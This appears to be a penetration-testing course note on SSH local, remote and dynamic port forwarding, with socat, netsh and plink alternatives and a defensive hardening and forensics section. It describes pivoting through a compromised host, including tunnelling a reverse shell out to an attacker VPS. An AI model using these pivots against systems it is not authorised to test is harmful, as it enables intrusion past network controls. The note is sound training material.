---
tags: [network, advanced, pivoting, evasion, vapt]
difficulty: advanced
module: "73 - Advanced Network Pivoting Tunnels and Evasion"
topic: "73.01 Port Forwarding Local Remote and Dynamic"
---

# 73.01 Port Forwarding: Local, Remote, and Dynamic

## 1. Introduction and Theoretical Foundations
Port forwarding is a foundational technique in network penetration testing, red teaming, and general IT administration. It serves as the primary mechanism to traverse network boundaries, bypass Network Address Translation (NAT), and evade strict ingress/egress firewall rules. 

In a typical enterprise environment, networks are segmented into tiers (e.g., DMZ, Internal Server Farm, User Workstations). A compromised host in the DMZ cannot simply route traffic to the internal network unless specific firewall rules permit it. Port forwarding allows an attacker to encapsulate traffic within an allowed protocol (most commonly SSH) and effectively use the compromised host as a network pivot or proxy.

### 1.1. The Mechanics of Network Address Translation (NAT)
To understand port forwarding, one must thoroughly understand NAT. NAT modifies the IP address information in IP packet headers while in transit across a traffic routing device. When an attacker is outside a NAT boundary, they cannot directly address internal IP addresses (e.g., `192.168.x.x` or `10.x.x.x`). Port forwarding solves this by binding a port on a public-facing or accessible interface and relaying the payload of incoming connections to a predefined internal IP and port. 

## 2. Deep Dive into SSH Multiplexing
Secure Shell (SSH) is not just a remote terminal protocol; it is a highly robust multiplexing protocol. Within a single encrypted TCP connection (typically on port 22), the SSH Connection Protocol can multiplex multiple logical channels. 

These channels can carry terminal sessions, X11 forwarding, and most importantly, arbitrary TCP/IP port forwarding. When a port forward is requested, SSH opens a new logical channel. The data sent to the local bound port is read by the SSH client, encapsulated in an `SSH_MSG_CHANNEL_DATA` packet, encrypted, and sent to the SSH server. The server decrypts it and writes the raw data to the target socket.

## 3. ASCII Architecture Diagram

```text
===================================================================================================
[Attacker Network]                      [DMZ / Firewall Boundary]                [Internal Network]
===================================================================================================
  [Attacker Machine]                      [Compromised Pivot]                    [Isolated Target]
    IP: 1.1.1.1                               IP: 2.2.2.2                           IP: 10.0.0.5
         |                                         |                                     |
         |                                         |                                     |
         |==== 1. Local Forwarding (-L) ==========>| (Listens on 2.2.2.2:80)             |
         |  (Binds 127.0.0.1:8080 on Attacker)     |==== Forwards to 10.0.0.5:80 =======>|
         |                                         |                                     |
         |<=== 2. Remote Forwarding (-R) ==========|                                     |
         |  (Binds 0.0.0.0:4444 on Attacker)       |                                     |
         |                                         |<=== Forwards internal traffic =====>|
         |                                         |                                     |
         |==== 3. Dynamic Forwarding (-D) ========>|                                     |
         |  (Binds SOCKS proxy on Attacker)        |==== Routes traffic dynamically ====/|
===================================================================================================
```

## 4. Local Port Forwarding (-L)

Local port forwarding is used when you want to access a remote resource that is restricted by a firewall, but you have SSH access to a machine that *can* access that resource.

### 4.1. Conceptual Workflow
1. The SSH client (Attacker) binds to a local port.
2. A local application connects to this port.
3. The SSH client intercepts the connection and sends the data over the encrypted SSH tunnel.
4. The SSH server (Pivot) decrypts the data and forwards it to the target IP and port.

### 4.2. Command Syntax and Examples
The basic syntax is:
```bash
ssh -L [local_bind_ip:]local_port:destination_ip:destination_port user@pivot_ip
```

**Scenario A: Bypassing Localhost Restrictions**
Often, a service (like a database or an administrative web panel) is bound strictly to `127.0.0.1` on the compromised server. It cannot be accessed externally.
```bash
# Executed on Attacker Machine
ssh -L 8080:127.0.0.1:80 root@2.2.2.2
```
Now, navigating to `http://localhost:8080` in the attacker's browser will serve the web panel running on the pivot's localhost.

**Scenario B: Accessing an Internal Subnet**
The pivot has a second network interface connected to `10.0.0.0/24`. We want to reach an internal SMB share on `10.0.0.5`.
```bash
# Executed on Attacker Machine
sudo ssh -L 445:10.0.0.5:445 root@2.2.2.2
```
*Note: Binding to low ports (like 445) requires root privileges on the attacker machine.*

### 4.3. Optimization Flags
- `-N`: Do not execute a remote command (disables the interactive shell).
- `-f`: Background the process immediately after authenticating.
- `-q`: Quiet mode.

## 5. Remote Port Forwarding (-R)

Remote port forwarding works in the reverse direction. It allows the SSH server (the pivot) to access resources on the SSH client's network (the attacker), or to expose an internal service to the attacker machine.

### 5.1. Conceptual Workflow
1. The SSH client instructs the SSH server to bind to a specific port.
2. When a connection is made to that port on the server, the server forwards the traffic through the tunnel.
3. The SSH client receives the traffic and forwards it to a final destination.

### 5.2. Command Syntax and Examples
```bash
ssh -R [remote_bind_ip:]remote_port:destination_ip:destination_port user@attacker_ip
```

**Scenario A: Catching an Internal Reverse Shell**
You are inside an internal network that cannot route to the internet, but you have SSH access *out* to your attacker VPS. You want to exploit an internal machine and catch a reverse shell.
```bash
# Executed on the Compromised Pivot
ssh -R 0.0.0.0:4444:127.0.0.1:4444 attacker@1.1.1.1
```
Now, an exploit payload executed on `10.0.0.5` connecting to `Pivot_IP:4444` will be tunneled out to the attacker VPS on port 4444.

**Critical Consideration: GatewayPorts**
By default, SSH remote forwarding only binds to `127.0.0.1` on the server. To allow external IP addresses to connect to the remote forwarded port, the SSH server's `/etc/ssh/sshd_config` must contain:
```text
GatewayPorts yes
```
Alternatively, `GatewayPorts clientspecified` allows binding to `0.0.0.0`.

## 6. Dynamic Port Forwarding (-D)

While local and remote forwarding map a single port to a single destination, dynamic forwarding transforms the SSH client into a SOCKS4/SOCKS5 proxy server. This allows for dynamic, multi-destination routing.

### 6.1. Conceptual Workflow
1. The SSH client binds to a local port acting as a SOCKS proxy.
2. Tools (configured to use SOCKS) send connection requests specifying the target IP/port to this proxy.
3. The SSH client tunnels these requests to the SSH server.
4. The SSH server resolves the connection dynamically acting as a NAT gateway.

### 6.2. Command Syntax and Examples
```bash
# Executed on Attacker Machine
ssh -D 127.0.0.1:9050 -N -f root@2.2.2.2
```
This enables the use of tools like `proxychains` or web browsers configured with FoxyProxy to browse the internal network seamlessly.

## 7. Alternative Tools for Port Forwarding

### 7.1. Socat
Socat is a powerful bidirectional byte stream relay. It can be used when SSH is unavailable.
```bash
# Port Forwarding: Listen on 8080, forward to 10.0.0.5:80
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.0.0.5:80
```

### 7.2. Windows Netsh
On Windows environments, the native `netsh` utility can create port proxies without requiring third-party tools. This relies on the IP Helper service.
```cmd
# Requires Administrator privileges
netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=80 connectaddress=10.0.0.5
```
To verify bindings:
```cmd
netsh interface portproxy show all
```

### 7.3. Plink.exe
A command-line interface for the PuTTY suite, heavily utilized in Windows Lots environments.
```cmd
plink.exe -l root -pw password -R 4444:127.0.0.1:4444 1.1.1.1
```

## 8. Defensive Configurations and Forensics

### 8.1. SSH Daemon Hardening
System administrators can lock down port forwarding capabilities in `/etc/ssh/sshd_config`:
- `AllowTcpForwarding no`: Completely disables local and remote port forwarding.
- `PermitOpen host:port`: Restricts local forwarding to specific destinations.
- `DisableForwarding yes`: Disables all forwarding features including X11.

### 8.2. Forensic Artifacts
- **Network Connections**: `netstat -antp` or `ss -antp` will show SSH bindings. A large number of connections established via an `sshd` process that is not port 22 indicates active forwarding.
- **Log Files**: Check `/var/log/auth.log` or `/var/log/secure`. Repeated connections or connections remaining open for extensive periods.
- **Process Trees**: An `sshd` process spawned with `-N` or `-f` flags is highly suspicious.
- **Windows Registry**: `netsh portproxy` configurations are stored in `HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp`.

## 9. Troubleshooting Tunnels
1. **Connection Refused**: Verify the destination port is open using a local connection first. Check internal firewalls (iptables, Windows Firewall) on the pivot and target.
2. **Channel 3: open failed: administratively prohibited**: This error indicates that the SSH server has disabled port forwarding (`AllowTcpForwarding no`), or the destination rejected the connection.
3. **Timeouts**: Tunnels dying silently due to stateful firewalls dropping idle TCP connections. Always use `-o ServerAliveInterval=30 -o ServerAliveCountMax=3` to keep the tunnel active.

## 10. Chaining Opportunities
- The SOCKS proxy created by Dynamic Forwarding (-D) is directly consumed by [[03 - ProxyChains and Traffic Routing]].
- Local forwarding can be used to pull remote services through tunnels established via [[04 - Chisel for TCP UDP Tunneling]].
- When TCP/IP port forwarding is insufficient (e.g., needing ICMP/UDP), upgrade the pivot using [[05 - Ligolo-ng Advanced TUN Interface Pivoting]].

## 11. Related Notes
- [[02 - SSH Tunneling and SOCKS Proxies]]
- [[03 - ProxyChains and Traffic Routing]]
- [[04 - Chisel for TCP UDP Tunneling]]
- [[05 - Ligolo-ng Advanced TUN Interface Pivoting]]
